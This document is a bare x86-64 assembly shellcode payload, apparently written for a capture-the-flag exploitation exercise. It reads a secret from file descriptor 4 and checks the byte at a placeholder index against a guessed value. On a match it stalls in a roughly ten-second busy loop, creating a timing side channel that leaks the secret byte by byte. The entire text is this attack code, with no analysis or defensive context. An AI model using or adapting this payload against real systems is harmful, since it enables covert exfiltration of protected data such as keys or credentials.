.global _start
_start:
.intel_syntax noprefix

# read(4, buf, 0x80);
mov rax, 0
mov rdi, 4
lea rsi, [rip+buf]
mov rdx, 0x80
syscall

# Read the byte value at index x.
mov rbx, 0
mov bl, BYTE PTR [rip+buf+x]

# Run the following loop if the y value is equal to the byte value
cmp bl, y
jne skip_loop

# Loop Start
mov rsi, 0
jmp ten_sec_loop_start

ten_sec_loop_back:
inc rsi

ten_sec_loop_start:
mov rdi, 0x7A8000000
cmpq rsi, rdi
jl ten_sec_loop_back
# Loop End

skip_loop:
inc rax

buf:
.asciz "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
